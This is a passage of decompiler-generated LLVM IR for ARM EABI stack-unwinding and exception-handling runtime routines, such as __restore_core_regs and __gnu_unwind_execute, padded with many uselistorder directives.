  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 83, 0, 17, 18, 82, 19, 42, 20, 41, 5, 80, 21, 81, 1, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 7, 3, 31, 32, 33, 34, 8, 35, 43, 44, 45, 9, 46, 47, 48, 49, 10, 50, 51, 52, 53, 11, 54, 12, 55, 56, 36, 57, 13, 58, 59, 60, 37, 61, 14, 62, 63, 64, 38, 65, 66, 67, 68, 69, 39, 70, 15, 71, 72, 73, 74, 75, 76, 40, 77, 16, 78, 6, 79, 4 }
  uselistorder i32 -3, { 4, 0, 5, 8, 7, 3, 1, 2, 6 }
  uselistorder i32 52, { 24, 2, 3, 6, 13, 14, 10, 11, 12, 15, 17, 16, 7, 19, 20, 4, 21, 0, 22, 23, 8, 9, 1, 18, 5 }
  uselistorder i32 48, { 24, 2, 0, 12, 10, 11, 16, 17, 13, 14, 20, 21, 22, 18, 23, 3, 15, 19, 1, 4, 7, 5, 8, 6, 9 }
  uselistorder i32 44, { 46, 3, 47, 48, 0, 16, 4, 17, 5, 6, 7, 27, 28, 29, 30, 31, 32, 24, 25, 26, 8, 22, 23, 9, 1, 10, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 11, 12, 13, 18, 19, 20, 21, 14, 43, 2, 44, 15, 45 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 147, 143, 148, 28, 29, 30, 31, 32, 33, 34, 35, 36, 142, 37, 38, 39, 41, 40, 43, 42, 44, 45, 46, 2, 47, 0, 3, 48, 49, 51, 50, 1, 54, 52, 53, 55, 60, 56, 61, 57, 62, 58, 59, 63, 64, 65, 66, 68, 69, 67, 141, 71, 70, 74, 75, 76, 72, 73, 79, 77, 80, 78, 81, 82, 83, 84, 85, 87, 88, 86, 89, 145, 91, 90, 94, 95, 96, 92, 93, 97, 98, 100, 101, 102, 99, 103, 146, 104, 106, 105, 108, 107, 109, 116, 110, 117, 111, 118, 112, 119, 113, 120, 114, 115, 122, 121, 123, 124, 125, 126, 131, 127, 132, 128, 133, 129, 130, 135, 134, 136, 137, 138, 140, 139 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_240f8.537 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 36, 37, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 32, 31, 33, 34, 35, 24, 25, 26, 27, 28, 29, 30, 11, 12, 13, 14, 15, 16, 17, 23, 22, 21, 20, 19, 18 }
  uselistorder i32 80, { 13, 14, 15, 1, 3, 2, 4, 5, 6, 9, 7, 8, 11, 10, 0, 12 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1aa28, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a944, { 1, 0 }
  uselistorder label %dec_label_pc_1a90c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a8d0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1a84c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1a78c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_1a788, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1a6e8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_1a644, { 1, 0 }
  uselistorder label %dec_label_pc_1a644.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1a644.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_1aae4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1aae4:
  %v0_1aae4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aae4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1aae4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1aae4, %bb
  %v10_1aaec = phi i32 [ %arg1, %dec_label_pc_1aae4 ], [ 0, %bb ]
  ret i32 %v10_1aaec

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 25, 26, 27, 47, 17, 24, 48, 49, 50, 51, 52, 5, 4, 53, 39, 40, 28, 29, 18, 32, 31, 30, 33, 6, 8, 42, 41, 19, 20, 9, 36, 7, 15, 16, 10, 11, 12, 34, 54, 55, 56, 13, 14, 43, 44, 45, 22, 46, 21, 23, 38, 35, 37, 57, 58 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aaf4 = load i32, i32* @r1, align 4
  %v2_1aaf4 = load i32, i32* @r2, align 4
  %v4_1aaf4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_1aaf4, i32 %v2_1aaf4, i32 2)
  ret i32 %v4_1aaf4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aafc = load i32, i32* @r1, align 4
  %v2_1aafc = load i32, i32* @r2, align 4
  %v4_1aafc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1aafc, i32 %v2_1aafc, i32 1)
  ret i32 %v4_1aafc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1ab04 = load i32, i32* @r1, align 4
  %v2_1ab04 = load i32, i32* @r2, align 4
  %v4_1ab04 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_1ab04, i32 %v2_1ab04, i32 0)
  ret i32 %v4_1ab04

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 12, 10, 11, 71, 13, 0, 22, 14, 23, 72, 73, 74, 18, 19, 20, 21, 36, 37, 38, 39, 75, 76, 77, 78, 79, 80, 94, 95, 96, 97, 1, 83, 84, 2, 85, 86, 3, 87, 81, 82, 33, 34, 4, 5, 6, 48, 49, 7, 8, 26, 40, 41, 42, 88, 89, 90, 91, 92, 93, 55, 56, 57, 43, 58, 59, 60, 61, 62, 50, 15, 16, 17, 53, 54, 51, 52, 24, 25, 44, 27, 28, 29, 30, 31, 32, 35, 9, 45, 46, 47, 63, 64, 65, 66, 67, 68, 69, 70 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1ab0c = add i32 %tmp, 56
  %v4_1ab0c = inttoptr i32 %v3_1ab0c to i32*
  %v5_1ab0c = load i32, i32* %v4_1ab0c, align 4
  %v6_1ab0c = add i32 %tmp, 60
  %v7_1ab0c = inttoptr i32 %v6_1ab0c to i32*
  %v8_1ab0c = load i32, i32* %v7_1ab0c, align 4
  %v2_1ab18 = load i32, i32* %arg1, align 4
  %v3_1ab18 = add i32 %tmp, 4
  %v4_1ab18 = inttoptr i32 %v3_1ab18 to i32*
  %v5_1ab18 = load i32, i32* %v4_1ab18, align 4
  store i32 %v5_1ab18, i32* @r1, align 4
  %v12_1ab18 = add i32 %tmp, 16
  %v13_1ab18 = inttoptr i32 %v12_1ab18 to i32*
  %v14_1ab18 = load i32, i32* %v13_1ab18, align 4
  store i32 %v14_1ab18, i32* @r4, align 4
  %v15_1ab18 = add i32 %tmp, 20
  %v16_1ab18 = inttoptr i32 %v15_1ab18 to i32*
  %v17_1ab18 = load i32, i32* %v16_1ab18, align 4
  store i32 %v17_1ab18, i32* @r5, align 4
  %v18_1ab18 = add i32 %tmp, 24
  %v19_1ab18 = inttoptr i32 %v18_1ab18 to i32*
  %v20_1ab18 = load i32, i32* %v19_1ab18, align 4
  store i32 %v20_1ab18, i32* @r6, align 4
  %v21_1ab18 = add i32 %tmp, 28
  %v22_1ab18 = inttoptr i32 %v21_1ab18 to i32*
  %v23_1ab18 = load i32, i32* %v22_1ab18, align 4
  store i32 %v23_1ab18, i32* @r7, align 4
  %v24_1ab18 = add i32 %tmp, 32
  %v25_1ab18 = inttoptr i32 %v24_1ab18 to i32*
  %v26_1ab18 = load i32, i32* %v25_1ab18, align 4
  store i32 %v26_1ab18, i32* @r8, align 4
  %v27_1ab18 = add i32 %tmp, 36
  %v28_1ab18 = inttoptr i32 %v27_1ab18 to i32*
  %v29_1ab18 = load i32, i32* %v28_1ab18, align 4
  store i32 %v29_1ab18, i32* @sb, align 4
  %v30_1ab18 = add i32 %tmp, 40
  %v31_1ab18 = inttoptr i32 %v30_1ab18 to i32*
  %v32_1ab18 = load i32, i32* %v31_1ab18, align 4
  store i32 %v32_1ab18, i32* @sl, align 4
  store i32 %v8_1ab0c, i32* @ip, align 4
  store i32 %v5_1ab0c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1ab0c)
  ret i32 %v2_1ab18

; uselistorder directives
  uselistorder i32 %v8_1ab0c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 71, 72, 73, 74, 16, 17, 7, 8, 1, 77, 9, 75, 76, 14, 15, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 2, 111, 112, 113, 114, 115, 116, 117, 118, 119, 10, 120, 121, 122, 32, 33, 27, 28, 3, 20, 21, 22, 23, 34, 35, 11, 36, 37, 12, 38, 13, 18, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 4, 24, 25, 26, 61, 19, 29, 5, 30, 31, 62, 63, 64, 65, 66, 67, 68, 6, 69, 70 }
  uselistorder i32 40, { 35, 31, 32, 33, 34, 14, 36, 2, 15, 6, 7, 3, 16, 1, 8, 5, 26, 17, 9, 18, 19, 20, 4, 21, 22, 0, 23, 25, 24, 11, 27, 12, 28, 10, 29, 13, 30 }
  uselistorder i32* @sb, { 115, 116, 117, 8, 9, 10, 11, 80, 81, 82, 83, 84, 85, 86, 87, 103, 106, 104, 105, 107, 88, 89, 90, 91, 1, 2, 19, 20, 21, 22, 23, 24, 25, 3, 4, 5, 6, 7, 96, 97, 92, 93, 94, 95, 12, 13, 14, 15, 16, 17, 18, 26, 0, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 98, 99, 100, 101, 102, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i32 36, { 21, 20, 4, 22, 6, 8, 5, 14, 16, 9, 15, 10, 0, 1, 2, 3, 11, 7, 17, 12, 18, 13, 19 }
  uselistorder i32* @r8, { 263, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 2, 262, 0, 58, 264, 15, 265, 59, 60, 61, 62, 45, 46, 47, 48, 49, 50, 51, 52, 53, 4, 54, 55, 56, 57, 63, 64, 65, 66, 16, 266, 17, 18, 42, 43, 5, 44, 267, 170, 171, 6, 172, 173, 174, 195, 196, 197, 198, 199, 13, 200, 201, 202, 203, 204, 205, 206, 207, 19, 175, 176, 177, 178, 208, 209, 210, 211, 212, 20, 179, 180, 181, 182, 213, 214, 215, 216, 21, 22, 93, 94, 95, 96, 97, 217, 218, 219, 220, 98, 99, 100, 101, 72, 73, 74, 75, 76, 77, 78, 36, 38, 39, 27, 29, 7, 23, 24, 25, 26, 28, 37, 30, 31, 32, 33, 34, 35, 40, 41, 187, 188, 183, 184, 185, 186, 8, 67, 1, 68, 69, 70, 14, 71, 79, 80, 81, 82, 83, 84, 85, 86, 89, 87, 88, 12, 90, 91, 92, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 9, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 11, 157, 158, 159, 160, 161, 162, 3, 163, 164, 165, 166, 167, 168, 169, 189, 190, 191, 192, 193, 194, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 10, 241, 242, 243, 244 }
  uselistorder i32 32, { 111, 108, 109, 110, 65, 112, 113, 61, 77, 114, 60, 99, 66, 62, 88, 86, 87, 83, 84, 85, 94, 95, 89, 90, 79, 80, 115, 92, 93, 67, 100, 101, 102, 1, 2, 4, 3, 103, 6, 5, 8, 7, 10, 9, 81, 82, 63, 68, 64, 104, 69, 91, 12, 11, 14, 13, 16, 15, 18, 17, 78, 20, 19, 21, 23, 22, 24, 26, 25, 28, 27, 29, 30, 32, 31, 70, 96, 33, 97, 34, 98, 35, 36, 37, 38, 71, 39, 40, 41, 72, 42, 0, 43, 44, 46, 45, 48, 47, 50, 49, 51, 53, 52, 73, 105, 74, 106, 75, 107, 55, 54, 57, 56, 58, 59, 76 }
  uselistorder i32 28, { 42, 10, 25, 43, 22, 44, 45, 46, 47, 7, 26, 27, 23, 24, 29, 11, 28, 12, 37, 38, 41, 8, 13, 0, 15, 1, 16, 2, 17, 3, 18, 4, 19, 5, 20, 6, 21, 9, 14, 40, 39, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 69, 70, 66, 67, 7, 11, 92, 82, 83, 93, 1, 71, 72, 73, 36, 37, 12, 68, 52, 84, 85, 53, 39, 40, 41, 42, 43, 44, 45, 46, 47, 13, 48, 14, 49, 15, 50, 51, 54, 55, 86, 87, 88, 89, 16, 17, 18, 19, 20, 74, 21, 22, 2, 23, 24, 25, 3, 26, 27, 28, 4, 75, 29, 76, 77, 78, 79, 30, 31, 5, 80, 32, 81, 33, 90, 34, 91, 6, 38, 35, 94 }
  uselistorder i32 20, { 129, 127, 128, 130, 1, 4, 9, 42, 131, 38, 132, 133, 134, 135, 5, 136, 137, 2, 138, 43, 10, 39, 40, 41, 44, 45, 46, 50, 51, 47, 48, 139, 115, 116, 117, 118, 119, 120, 121, 11, 107, 108, 122, 3, 52, 12, 53, 54, 0, 13, 49, 32, 14, 29, 15, 30, 16, 31, 110, 111, 6, 112, 17, 113, 28, 109, 55, 18, 56, 57, 58, 59, 60, 61, 19, 62, 63, 64, 65, 66, 67, 20, 68, 69, 70, 71, 72, 73, 74, 75, 76, 21, 77, 78, 79, 80, 81, 82, 83, 84, 22, 85, 86, 87, 88, 89, 90, 23, 91, 92, 24, 93, 94, 95, 96, 97, 7, 98, 25, 99, 100, 101, 102, 8, 103, 26, 104, 105, 106, 114, 33, 34, 35, 36, 37, 123, 124, 125, 27, 126 }
  uselistorder i32* @r1, { 96, 13, 11, 12, 2, 97, 98, 31, 32, 36, 24, 0, 100, 25, 99, 62, 26, 27, 28, 33, 3, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 4, 120, 121, 34, 35, 29, 30, 1, 45, 46, 122, 14, 124, 125, 18, 38, 19, 123, 23, 41, 42, 5, 64, 65, 6, 7, 39, 40, 15, 63, 37, 47, 70, 16, 101, 102, 17, 9, 48, 66, 20, 21, 22, 69, 51, 43, 10, 44, 49, 50, 67, 68, 8, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 27, 28, 25, 26, 4, 5, 1, 6, 0, 7, 30, 29 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ab28 = load i32, i32* @r0, align 4
  ret i32 %v1_1ab28
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1ab30 = load i32, i32* @r0, align 4
  ret i32 %v1_1ab30
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab44 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab48 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_1ab44, i32 0)
  ret i32 %v2_1ab48

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab68 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab6c = call i32 @__gnu_Unwind_Resume(i32 %v2_1ab68, i32 0)
  ret i32 %v2_1ab6c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1ab8c = ptrtoint i32* %stack_var_-68 to i32
  %v2_1ab90 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1ab8c, i32 0)
  ret i32 %v2_1ab90

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1abb0 = ptrtoint i32* %stack_var_-68 to i32
  %v6_1abb4 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_1abb0, i32 %arg2, i8* %arg3, i32 %v2_1abb0)
  ret i32 %v6_1abb4

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1abe0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1abe8 = add i32 %tmp1, 76
  %v2_1abe8 = inttoptr i32 %v1_1abe8 to i32*
  %v3_1abe8 = load i32, i32* %v2_1abe8, align 4
  %v1_1abec = add i32 %v3_1abe8, 7
  %v2_1abec = inttoptr i32 %v1_1abec to i8*
  %v3_1abec = load i8, i8* %v2_1abec, align 1
  %v4_1abec = zext i8 %v3_1abec to i32
  %v1_1abf0 = add i32 %v3_1abe8, 8
  %v3_1abf4 = mul nuw nsw i32 %v4_1abec, 4
  %v2_1abf8 = add i32 %v3_1abf4, %v1_1abf0
  %v3_1abf8 = inttoptr i32 %v2_1abf8 to i8*
  ret i8* %v3_1abf8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_1ac08 = load i32, i32* @r6, align 4
  %v21_1ac08 = load i32, i32* @lr, align 4
  %v0_1ac0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ac0c, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_1ac1c

dec_label_pc_1ac1c:                               ; preds = %dec_label_pc_1ac1c.backedge, %entry
  %v3_1ac28 = phi i32 [ %v0_1ac1c.pre, %dec_label_pc_1ac1c.backedge ], [ %tmp, %entry ]
  %v1_1ac1c = add i32 %v3_1ac28, 8
  %v2_1ac1c = inttoptr i32 %v1_1ac1c to i8*
  %v3_1ac1c = load i8, i8* %v2_1ac1c, align 1
  %v4_1ac1c = zext i8 %v3_1ac1c to i32
  store i32 %v4_1ac1c, i32* %r3.global-to-local, align 4
  %v2_1ac20 = icmp eq i8 %v3_1ac1c, 0
  store i1 %v2_1ac20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac20, label %dec_label_pc_1ac30, label %.thread

.thread:                                          ; preds = %dec_label_pc_1ac1c
  %v2_1ac24 = add nsw i32 %v4_1ac1c, -1
  store i32 %v2_1ac24, i32* %r3.global-to-local, align 4
  %v2_1ac28 = trunc i32 %v2_1ac24 to i8
  store i8 %v2_1ac28, i8* %v2_1ac1c, align 1
  %v0_1ac2c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ac2c.pr.pr, label %.thread.dec_label_pc_1ac30_crit_edge, label %dec_label_pc_1ac58

.thread.dec_label_pc_1ac30_crit_edge:             ; preds = %.thread
  %v0_1ac30.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ac30

dec_label_pc_1ac30:                               ; preds = %.thread.dec_label_pc_1ac30_crit_edge, %dec_label_pc_1ac1c
  %v0_1ac30 = phi i32 [ %v0_1ac30.pre, %.thread.dec_label_pc_1ac30_crit_edge ], [ %v3_1ac28, %dec_label_pc_1ac1c ]
  %v1_1ac30 = add i32 %v0_1ac30, 9
  %v2_1ac30 = inttoptr i32 %v1_1ac30 to i8*
  %v3_1ac30 = load i8, i8* %v2_1ac30, align 1
  %v4_1ac30 = zext i8 %v3_1ac30 to i32
  store i32 %v4_1ac30, i32* %r3.global-to-local, align 4
  %v2_1ac34 = icmp eq i8 %v3_1ac30, 0
  store i1 %v2_1ac34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac34, label %dec_label_pc_1ad38, label %dec_label_pc_1ac3c

dec_label_pc_1ac3c:                               ; preds = %dec_label_pc_1ad2c, %dec_label_pc_1ac30
  %v2_1ac40 = phi i32 [ %v0_1ad2c, %dec_label_pc_1ad2c ], [ %v0_1ac30, %dec_label_pc_1ac30 ]
  %v0_1ac3c = phi i32 [ %v4_1ad2c, %dec_label_pc_1ad2c ], [ %v4_1ac30, %dec_label_pc_1ac30 ]
  %v1_1ac3c = add nsw i32 %v0_1ac3c, -1
  store i32 %v1_1ac3c, i32* %r3.global-to-local, align 4
  %v1_1ac40 = trunc i32 %v1_1ac3c to i8
  %v3_1ac40 = add i32 %v2_1ac40, 9
  %v4_1ac40 = inttoptr i32 %v3_1ac40 to i8*
  store i8 %v1_1ac40, i8* %v4_1ac40, align 1
  %v0_1ac44 = load i32, i32* @r5, align 4
  %v1_1ac44 = add i32 %v0_1ac44, 4
  %v2_1ac44 = inttoptr i32 %v1_1ac44 to i32*
  %v3_1ac44 = load i32, i32* %v2_1ac44, align 4
  store i32 %v3_1ac44, i32* %r2.global-to-local, align 4
  %v1_1ac48 = inttoptr i32 %v3_1ac44 to i32*
  %v2_1ac48 = load i32, i32* %v1_1ac48, align 4
  store i32 %v2_1ac48, i32* %r0.global-to-local, align 4
  %v4_1ac48 = add i32 %v3_1ac44, 4
  store i32 %v4_1ac48, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1ac50 = inttoptr i32 %v0_1ac44 to i32*
  store i32 %v2_1ac48, i32* %v1_1ac50, align 4
  %v5_1ac50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1ac50, i32* %v2_1ac44, align 4
  %v0_1ac54 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac54 = trunc i32 %v0_1ac54 to i8
  %v2_1ac54 = load i32, i32* @r5, align 4
  %v3_1ac54 = add i32 %v2_1ac54, 8
  %v4_1ac54 = inttoptr i32 %v3_1ac54 to i8*
  store i8 %v1_1ac54, i8* %v4_1ac54, align 1
  br label %dec_label_pc_1ac58

dec_label_pc_1ac58:                               ; preds = %.thread, %dec_label_pc_1ac3c, %.thread6
  %v0_1ac58 = load i32, i32* @r5, align 4
  %v1_1ac58 = inttoptr i32 %v0_1ac58 to i32*
  %v2_1ac58 = load i32, i32* %v1_1ac58, align 4
  %v3_1ac5c = udiv i32 %v2_1ac58, 16777216
  store i32 %v3_1ac5c, i32* @r4, align 4
  store i32 %v3_1ac5c, i32* %ip.global-to-local, align 4
  %v3_1ac64 = mul i32 %v2_1ac58, 256
  store i32 %v3_1ac64, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_1ac58, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1ac64, i32* %v1_1ac58, align 4
  br i1 %tmp183, label %dec_label_pc_1ad38, label %dec_label_pc_1ac74

dec_label_pc_1ac74:                               ; preds = %dec_label_pc_1ac58
  %v0_1ac74 = load i32, i32* @r4, align 4
  %v1_1ac74 = and i32 %v0_1ac74, 128
  store i32 %v1_1ac74, i32* %r1.global-to-local, align 4
  %v2_1ac74 = icmp eq i32 %v1_1ac74, 0
  store i1 %v2_1ac74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac74, label %dec_label_pc_1ad50, label %dec_label_pc_1ac7c

dec_label_pc_1ac7c:                               ; preds = %dec_label_pc_1ac74
  %v1_1ac7c = and i32 %v0_1ac74, 240
  store i32 %v1_1ac7c, i32* @r6, align 4
  %v7_1ac80 = icmp eq i32 %v1_1ac7c, 128
  store i1 %v7_1ac80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ac80, label %dec_label_pc_1ac88, label %dec_label_pc_1adac

dec_label_pc_1ac88:                               ; preds = %dec_label_pc_1ac7c
  %v0_1ac88 = load i32, i32* @r5, align 4
  %v1_1ac88 = add i32 %v0_1ac88, 8
  %v2_1ac88 = inttoptr i32 %v1_1ac88 to i8*
  %v3_1ac88 = load i8, i8* %v2_1ac88, align 1
  %v4_1ac88 = zext i8 %v3_1ac88 to i32
  store i32 %v4_1ac88, i32* %r3.global-to-local, align 4
  %v2_1ac8c = icmp eq i8 %v3_1ac88, 0
  store i1 %v2_1ac8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ac8c, label %dec_label_pc_1ac9c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1ac88
  %v2_1ac90 = add nsw i32 %v4_1ac88, -1
  store i32 %v2_1ac90, i32* %r3.global-to-local, align 4
  %v2_1ac94 = trunc i32 %v2_1ac90 to i8
